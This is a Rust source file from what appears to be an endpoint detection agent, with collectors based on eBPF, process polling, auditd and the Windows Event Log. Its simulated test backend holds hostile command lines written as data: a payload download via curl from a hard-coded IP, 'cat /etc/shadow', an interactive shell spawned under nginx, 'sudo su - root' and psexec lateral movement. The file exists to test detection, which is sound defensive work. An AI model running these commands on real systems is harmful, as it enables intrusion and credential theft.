// src/collector/mod.rs — Event collection engine
//
// Backends (selected at runtime from config.toml):
//   "ebpf"      — eBPF via aya crate (Linux 5.8+, BTF enabled). Falls back to procmon.
//   "procmon"   — /proc polling via sysinfo. Works everywhere, ~5s latency.
//   "audit"     — auditd Unix socket. Rich data, requires auditd running.
//   "simulated" — Deterministic attack scenarios. Use for testing/demo.
//
// Production recommendation: start with "procmon", move to "ebpf" after verifying
// BTF is enabled (ls /sys/kernel/btf/vmlinux).

use crate::config::CollectorConfig;
use crate::types::{RawEvent, EventType};
use anyhow::Result;
use chrono::Utc;
use dashmap::DashMap;
use sysinfo::{ProcessRefreshKind, RefreshKind, System};
use tokio::sync::mpsc;
use tracing::{info, warn, debug};
use uuid::Uuid;
use std::sync::Arc;
use std::collections::HashMap;
#[cfg(unix)]
use std::io::{BufRead, BufReader};
#[cfg(unix)]
use std::os::unix::net::UnixStream;

// Real eBPF userspace loader (aya). Compiled only with the `ebpf` feature so the
// agent still builds with no BPF toolchain present.
#[cfg(feature = "ebpf")]
pub mod ebpf;

// Windows Event Log backend — compiled only on Windows.
#[cfg(target_os = "windows")]
pub mod windows;

pub struct EventCollector {
    config:   CollectorConfig,
    agent_id: String,
    hostname: String,
    pub rx:   Arc<tokio::sync::Mutex<mpsc::Receiver<RawEvent>>>,
    tx:       mpsc::Sender<RawEvent>,
}

impl EventCollector {
    pub async fn new(config: CollectorConfig, agent_id: &str, hostname: &str) -> Result<Self> {
        let (tx, rx) = mpsc::channel(config.event_queue_depth.max(1024));
        Ok(Self {
            config,
            agent_id: agent_id.to_string(),
            hostname: hostname.to_string(),
            rx: Arc::new(tokio::sync::Mutex::new(rx)),
            tx,
        })
    }

    pub async fn start(&self) -> Result<()> {
        info!("🔬 Collector backend: {}", self.config.backend);
        match self.config.backend.as_str() {
            "ebpf"        => self.start_ebpf().await,
            "audit"       => self.start_auditd().await,
            "simulated"   => self.start_simulated().await,
            "wineventlog" => self.start_wineventlog().await,
            _             => self.start_procmon().await,
        }
    }

    // ── Windows Event Log backend ─────────────────────────────
    // The native richer source on Windows. On non-Windows this cleanly falls
    // back to procmon (the backend simply isn't compiled in elsewhere).
    async fn start_wineventlog(&self) -> Result<()> {
        #[cfg(target_os = "windows")]
        {
            // Run the Event Log poller AND procmon together: Event Log gives
            // security-audited events (logons, service installs, 4688), procmon
            // gives continuous process visibility even without audit policy.
            if let Err(e) = crate::collector::windows::start(
                self.tx.clone(), self.agent_id.clone(), self.hostname.clone(), 5,
            ).await {
                warn!("⚠️  Windows Event Log collector failed to start: {} — using procmon only.", e);
            }
            // procmon as the always-on complement.
            self.start_procmon().await
        }
        #[cfg(not(target_os = "windows"))]
        {
            warn!("⚠️  'wineventlog' backend requested but this is not Windows. Using procmon.");
            self.start_procmon().await
        }
    }

    // ── eBPF backend ──────────────────────────────────────────
    // Real syscall-level monitoring via aya + a CO-RE BPF object. Compiled in
    // only when the `ebpf` feature is enabled; otherwise this falls back to
    // procmon. At runtime, ANY failure (no BTF, old kernel, verifier rejection,
    // missing privilege, object not found) also falls back — with clear logging
    // at each step so the operator knows why eBPF didn't engage.
    async fn start_ebpf(&self) -> Result<()> {
        if !crate::platform::supports_ebpf() {
            warn!("⚠️  eBPF is not supported on this platform ({}). Using procmon.", crate::platform::platform_label());
            return self.start_procmon().await;
        }
        #[cfg(feature = "ebpf")]
        {
            if !std::path::Path::new("/sys/kernel/btf/vmlinux").exists() {
                warn!("⚠️  eBPF: BTF unavailable (/sys/kernel/btf/vmlinux missing).");
                warn!("   To enable: kernel built with CONFIG_DEBUG_INFO_BTF=y (most distros 5.8+ have it).");
                warn!("   Falling back to procmon (5s polling).");
                return self.start_procmon().await;
            }
            info!("🔬 eBPF: BTF present — loading CO-RE programs via aya…");
            match crate::collector::ebpf::start(
                self.tx.clone(), self.agent_id.clone(), self.hostname.clone()
            ).await {
                Ok(()) => {
                    info!("✅ eBPF backend active — sub-millisecond syscall visibility (exec/exit/connect/ptrace/module-load).");
                    // Complement the kprobe coverage with the /proc/net listening
                    // socket sweep, which the connect kprobe doesn't capture.
                    let tx = self.tx.clone();
                    let agent_id = self.agent_id.clone();
                    let hostname = self.hostname.clone();
                    tokio::task::spawn_blocking(move || {
                        loop {
                            emit_network_events(&tx, &agent_id, &hostname);
                            std::thread::sleep(std::time::Duration::from_secs(10));
                        }
                    });
                    Ok(())
                }
                Err(e) => {
                    tracing::error!("⚠️  eBPF load/attach failed: {:#}", e);
                    warn!("   Falling back to procmon (5s polling). Fix the cause above to get real-time detection.");
                    self.start_procmon().await
                }
            }
        }
        #[cfg(not(feature = "ebpf"))]
        {
            warn!("⚠️  eBPF backend requested but agent was built without the `ebpf` feature.");
            warn!("   Rebuild with: cargo build --release --features ebpf,yara (and compile bpf/nebula.bpf.o — see bpf/README.md).");
            warn!("   Falling back to procmon (5s polling).");
            self.start_procmon().await
        }
    }

    // ── procmon backend — /proc polling ───────────────────────
    async fn start_procmon(&self) -> Result<()> {
        // "procmon" uses sysinfo (cross-platform), NOT /proc directly — the
        // message reflects the real source so Windows logs don't imply Linux.
        info!("🔎 procmon: polling process table (sysinfo) every {}s", 5);
        let tx         = self.tx.clone();
        let agent_id   = self.agent_id.clone();
        let hostname   = self.hostname.clone();
        // Track known PIDs to detect new processes
        let known_pids: Arc<DashMap<u32, (String, Vec<String>)>> = Arc::new(DashMap::new());

        tokio::task::spawn_blocking(move || {
            let mut sys = System::new_with_specifics(
                RefreshKind::new().with_processes(
                    ProcessRefreshKind::new()
                        .with_cmd(sysinfo::UpdateKind::Always)
                        .with_exe(sysinfo::UpdateKind::Always)
                        .with_environ(sysinfo::UpdateKind::Always)
                )
            );

            loop {
                sys.refresh_processes_specifics(
                    sysinfo::ProcessesToUpdate::All,
                    false,
                    sysinfo::ProcessRefreshKind::new()
                        .with_cmd(sysinfo::UpdateKind::Always)
                        .with_exe(sysinfo::UpdateKind::Always)
                );

                for (pid, proc) in sys.processes() {
                    let pid_u32 = pid.as_u32();
                    let name    = proc.name().to_string_lossy().to_string();
                    let cmd: Vec<String> = proc.cmd().iter().map(|s| s.to_string_lossy().to_string()).collect();
                    let cmd_str = cmd.join(" ");

                    if known_pids.contains_key(&pid_u32) { continue; }

                    // New process — emit exec event
                    known_pids.insert(pid_u32, (name.clone(), cmd.clone()));

                    let ppid = proc.parent().map(|p| p.as_u32()).unwrap_or(0);

                    // User identity is represented differently per-platform by `sysinfo`:
                    //  - On Unix, `Uid` derefs to a numeric u32 UID.
                    //  - On Windows, `Uid` wraps a `Sid` (a Security Identifier string),
                    //    which has no numeric form. We keep `uid` as 0 there and preserve
                    //    the SID string in `extra["user_sid"]` so identity isn't lost.
                    #[cfg(unix)]
                    let (uid, user_sid): (u32, Option<String>) =
                        (proc.user_id().map(|u| **u).unwrap_or(0), None);
                    #[cfg(windows)]
                    let (uid, user_sid): (u32, Option<String>) =
                        (0, proc.user_id().map(|u| u.to_string()));
                    #[cfg(not(any(unix, windows)))]
                    let (uid, user_sid): (u32, Option<String>) = (0, None);

                    // Resolve parent name
                    let parent_name = proc.parent()
                        .and_then(|ppid| sys.process(ppid))
                        .map(|p| p.name().to_string_lossy().to_string())
                        .unwrap_or_default();

                    // Resolve exe path
                    let exe_path = proc.exe()
                        .map(|p| p.to_string_lossy().to_string());

                    // File hash of exe (SHA-256)
                    let file_hash = exe_path.as_ref()
                        .and_then(|p| std::fs::read(p).ok())
                        .map(|data| {
                            use sha2::{Sha256, Digest};
                            format!("{:x}", Sha256::digest(&data))
                        });

                    // file_hash already computed above.

                    let mut extra = HashMap::new();
                    if let Some(sid) = user_sid {
                        extra.insert("user_sid".to_string(), serde_json::Value::String(sid));
                    }

                    let event = RawEvent {
                        id:                Uuid::new_v4().to_string(),
                        agent_id:          agent_id.clone(),
                        hostname:          hostname.clone(),
                        timestamp:         Utc::now(),
                        event_type:        EventType::ProcessExec,
                        pid:               pid_u32,
                        ppid,
                        uid,
                        gid:               0,
                        process_name:      name.clone(),
                        process_path:      exe_path.clone(),
                        command_line:      Some(cmd_str),
                        parent_process:    Some(parent_name),
                        file_path:         exe_path,
                        file_hash,
                        network_dest_ip:   None,
                        network_dest_port: None,
                        network_proto:     None,
                        syscall:           None,
                        return_code:       None,
                        container_id:      None,
                        namespace:         None,
                        extra,
                    };

                    // Non-blocking send — drop if queue is full (backpressure)
                    if tx.try_send(event).is_err() {
                        debug!("procmon: event queue full, dropping event for pid={}", pid_u32);
                    }
                }

                // Prune exited processes from known_pids
                let live_pids: std::collections::HashSet<u32> =
                    sys.processes().keys().map(|p| p.as_u32()).collect();
                known_pids.retain(|pid, _| live_pids.contains(pid));

                // Also emit network connection events from /proc/net/tcp
                emit_network_events(&tx, &agent_id, &hostname);

                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        });

        Ok(())
    }

    // ── auditd backend — Unix socket reader ───────────────────
    async fn start_auditd(&self) -> Result<()> {
        #[cfg(not(unix))]
        {
            warn!("⚠️  auditd backend is Linux-only — using procmon on this platform.");
            return self.start_procmon().await;
        }
        #[cfg(unix)]
        {
        let socket_path = self.config.auditd_socket.clone();
        info!("📋 auditd: connecting to {}", socket_path);

        if !std::path::Path::new(&socket_path).exists() {
            warn!("⚠️  auditd: socket {} not found — falling back to procmon", socket_path);
            warn!("   To enable: install auditd and start the service");
            return self.start_procmon().await;
        }

        let tx         = self.tx.clone();
        let agent_id   = self.agent_id.clone();
        let hostname   = self.hostname.clone();

        tokio::task::spawn_blocking(move || {
            let stream = match UnixStream::connect(&socket_path) {
                Ok(s) => { info!("📋 auditd: connected to {}", socket_path); s }
                Err(e) => {
                    warn!("auditd: connect failed: {} — check audisp-af_unix plugin", e);
                    return;
                }
            };
            stream.set_read_timeout(Some(std::time::Duration::from_secs(5))).ok();

            let reader = BufReader::new(stream);
            let mut buf = HashMap::new();  // accumulate multi-line audit records

            for line in reader.lines().flatten() {
                if let Some(event) = parse_audit_record(&line, &agent_id, &hostname, &mut buf) {
                    if tx.try_send(event).is_err() {
                        debug!("auditd: queue full, dropping record");
                    }
                }
            }
            warn!("auditd: socket disconnected");
        });

        Ok(())
        }  // end #[cfg(unix)]
    }

    // ── simulated backend — realistic attack scenarios ─────────
    async fn start_simulated(&self) -> Result<()> {
        info!("🎭 simulated event collector starting");
        let tx       = self.tx.clone();
        let agent_id = self.agent_id.clone();
        let hostname = self.hostname.clone();

        tokio::spawn(async move {
            // Scenario 1: Web server spawning shell (webshell/RCE)
            tokio::time::sleep(std::time::Duration::from_secs(8)).await;
            let _ = tx.send(make_webshell_event(&agent_id, &hostname)).await;

            // Scenario 2: C2 download
            tokio::time::sleep(std::time::Duration::from_secs(3)).await;
            let _ = tx.send(make_c2_download_event(&agent_id, &hostname)).await;

            // Scenario 3: Privilege escalation attempt
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            let _ = tx.send(make_privesc_event(&agent_id, &hostname)).await;

            // Scenario 4: Credential access
            tokio::time::sleep(std::time::Duration::from_secs(4)).await;
            let _ = tx.send(make_cred_event(&agent_id, &hostname)).await;

            // Scenario 5: Network beacon
            tokio::time::sleep(std::time::Duration::from_secs(6)).await;
            let _ = tx.send(make_beacon_event(&agent_id, &hostname)).await;

            // Scenario 6: Lateral movement
            tokio::time::sleep(std::time::Duration::from_secs(10)).await;
            let _ = tx.send(make_lateral_event(&agent_id, &hostname)).await;

            // Repeat cycle every 120 seconds
            loop {
                tokio::time::sleep(std::time::Duration::from_secs(120)).await;
                for evt in [
                    make_webshell_event(&agent_id, &hostname),
                    make_c2_download_event(&agent_id, &hostname),
                    make_privesc_event(&agent_id, &hostname),
                    make_cred_event(&agent_id, &hostname),
                ] {
                    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                    let _ = tx.send(evt).await;
                }
            }
        });

        Ok(())
    }
}

// ── Audit record parser ────────────────────────────────────────
// Unix-only: the sole caller is the auditd collector, which is itself
// #[cfg(unix)]. Gating this to match avoids a dead-code warning on Windows.
#[cfg(unix)]
fn parse_audit_record(
    line: &str,
    agent_id: &str,
    hostname: &str,
    buf: &mut HashMap<String, String>,
) -> Option<RawEvent> {
    // Audit format: type=EXECVE msg=audit(1234567890.123:456): argc=2 a0="bash" a1="-c"
    if line.is_empty() || !line.starts_with("type=") { return None; }

    let rec_type = line.split_whitespace().next()?.strip_prefix("type=")?;
    let fields: HashMap<&str, &str> = line.split_whitespace()
        .filter_map(|pair| {
            let mut it = pair.splitn(2, '=');
            Some((it.next()?, it.next()?))
        })
        .collect();

    // Extract serial number to correlate multi-record events
    let serial = fields.get("msg")
        .and_then(|m| m.split(':').nth(1))
        .unwrap_or("0")
        .to_string();

    match rec_type {
        "EXECVE" => {
            let cmd = (0..10)
                .filter_map(|i| fields.get(format!("a{}", i).as_str()).map(|v| v.trim_matches('"').to_string()))
                .collect::<Vec<_>>()
                .join(" ");

            buf.insert(serial.clone(), cmd.clone());

            let pid = fields.get("pid").and_then(|p| p.parse().ok()).unwrap_or(0);
            let uid = fields.get("uid").and_then(|u| u.parse().ok()).unwrap_or(0);

            Some(RawEvent {
                id:                Uuid::new_v4().to_string(),
                agent_id:          agent_id.to_string(),
                hostname:          hostname.to_string(),
                timestamp:         Utc::now(),
                event_type:        EventType::ProcessExec,
                pid, ppid: 0, uid, gid: 0,
                process_name:      cmd.split_whitespace().next().unwrap_or("").to_string(),
                process_path:      None,
                command_line:      Some(cmd),
                parent_process:    None,
                file_path:         None, file_hash: None,
                network_dest_ip:   None, network_dest_port: None, network_proto: None,
                syscall: Some("execve".to_string()), return_code: None,
                container_id: None, namespace: None, extra: HashMap::new(),
            })
        }
        "SYSCALL" => {
            // SYSCALL records provide context — buffer for correlation
            let syscall = fields.get("syscall").copied().unwrap_or("").to_string();
            buf.insert(format!("syscall:{}", serial), syscall);
            None
        }
        "PATH" => {
            // File path record
            let name = fields.get("name").map(|n| n.trim_matches('"').to_string());
            if let Some(path) = name {
                let pid = fields.get("pid").and_then(|p| p.parse().ok()).unwrap_or(0);
                return Some(RawEvent {
                    id:         Uuid::new_v4().to_string(),
                    agent_id:   agent_id.to_string(),
                    hostname:   hostname.to_string(),
                    timestamp:  Utc::now(),
                    event_type: EventType::FileOpen,
                    pid, ppid: 0, uid: 0, gid: 0,
                    process_name: String::new(), process_path: None,
                    command_line: None, parent_process: None,
                    file_path: Some(path), file_hash: None,
                    network_dest_ip: None, network_dest_port: None, network_proto: None,
                    syscall: None, return_code: None,
                    container_id: None, namespace: None, extra: HashMap::new(),
                });
            }
            None
        }
        _ => None,
    }
}

// ── /proc/net/tcp connection events ───────────────────────────
fn emit_network_events(tx: &mpsc::Sender<RawEvent>, agent_id: &str, hostname: &str) {
    let Ok(content) = std::fs::read_to_string("/proc/net/tcp") else { return };
    for line in content.lines().skip(1).take(100) {
        let fields: Vec<&str> = line.split_whitespace().collect();
        if fields.len() < 4 { continue; }
        if fields[3] != "01" { continue; }  // only ESTABLISHED

        let Some((ip, port)) = parse_hex_addr(fields[2]) else { continue };
        // Skip private/local
        if ip.starts_with("127.") || ip.starts_with("10.") || ip.starts_with("192.168.")
            || ip.starts_with("172.") || ip == "0.0.0.0" { continue; }

        let pid: u32 = fields.get(9).and_then(|p| p.parse().ok()).unwrap_or(0);

        let event = RawEvent {
            id:                Uuid::new_v4().to_string(),
            agent_id:          agent_id.to_string(),
            hostname:          hostname.to_string(),
            timestamp:         Utc::now(),
            event_type:        EventType::NetworkConnect,
            pid, ppid: 0, uid: 0, gid: 0,
            process_name:      String::new(),
            process_path:      None, command_line: None, parent_process: None,
            file_path:         None, file_hash: None,
            network_dest_ip:   Some(ip),
            network_dest_port: Some(port),
            network_proto:     Some("tcp".to_string()),
            syscall: None, return_code: None,
            container_id: None, namespace: None, extra: HashMap::new(),
        };
        let _ = tx.try_send(event);
    }
}

fn parse_hex_addr(hex: &str) -> Option<(String, u16)> {
    let parts: Vec<&str> = hex.splitn(2, ':').collect();
    if parts.len() != 2 { return None; }
    let port = u16::from_str_radix(parts[1], 16).ok()?;
    if parts[0].len() == 8 {
        let n = u32::from_str_radix(parts[0], 16).ok()?;
        let ip = format!("{}.{}.{}.{}", n&0xFF, (n>>8)&0xFF, (n>>16)&0xFF, (n>>24)&0xFF);
        Some((ip, port))
    } else { None }
}

// ── Simulated events ───────────────────────────────────────────
fn base_event(agent_id: &str, hostname: &str, etype: EventType) -> RawEvent {
    RawEvent {
        id: Uuid::new_v4().to_string(),
        agent_id: agent_id.to_string(), hostname: hostname.to_string(),
        timestamp: Utc::now(), event_type: etype,
        pid: 1000 + rand_u32() % 30000, ppid: 1, uid: 33, gid: 33,
        process_name: String::new(), process_path: None, command_line: None,
        parent_process: None, file_path: None, file_hash: None,
        network_dest_ip: None, network_dest_port: None, network_proto: None,
        syscall: None, return_code: None, container_id: None, namespace: None,
        extra: HashMap::new(),
    }
}

fn make_webshell_event(agent_id: &str, hostname: &str) -> RawEvent {
    let mut e = base_event(agent_id, hostname, EventType::ProcessExec);
    e.process_name = "bash".into();
    e.command_line = Some("bash -i".into());
    e.parent_process = Some("nginx".into());
    e.ppid = 999;
    e.uid = 33;  // www-data
    e
}

fn make_c2_download_event(agent_id: &str, hostname: &str) -> RawEvent {
    let mut e = base_event(agent_id, hostname, EventType::ProcessExec);
    e.process_name = "curl".into();
    e.command_line = Some("curl -s http://185.220.101.47/payload.sh -o /tmp/.update".into());
    e.parent_process = Some("bash".into());
    e.network_dest_ip = Some("185.220.101.47".into());
    e.network_dest_port = Some(80);
    e
}

fn make_privesc_event(agent_id: &str, hostname: &str) -> RawEvent {
    let mut e = base_event(agent_id, hostname, EventType::ProcessExec);
    e.process_name = "sudo".into();
    e.command_line = Some("sudo su - root".into());
    e.uid = 1001;
    e
}

fn make_cred_event(agent_id: &str, hostname: &str) -> RawEvent {
    let mut e = base_event(agent_id, hostname, EventType::FileOpen);
    e.process_name = "cat".into();
    e.command_line = Some("cat /etc/shadow".into());
    e.file_path = Some("/etc/shadow".into());
    e.uid = 33;
    e
}

fn make_beacon_event(agent_id: &str, hostname: &str) -> RawEvent {
    let mut e = base_event(agent_id, hostname, EventType::NetworkConnect);
    e.process_name = "python3".into();
    e.network_dest_ip = Some("185.220.101.47".into());
    e.network_dest_port = Some(443);
    e.network_proto = Some("tcp".into());
    e
}

fn make_lateral_event(agent_id: &str, hostname: &str) -> RawEvent {
    let mut e = base_event(agent_id, hostname, EventType::ProcessExec);
    e.process_name = "psexec".into();
    e.command_line = Some("psexec \\\\192.168.1.5 cmd.exe".into());
    e.parent_process = Some("cmd.exe".into());
    e
}

fn rand_u32() -> u32 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().subsec_nanos()
}
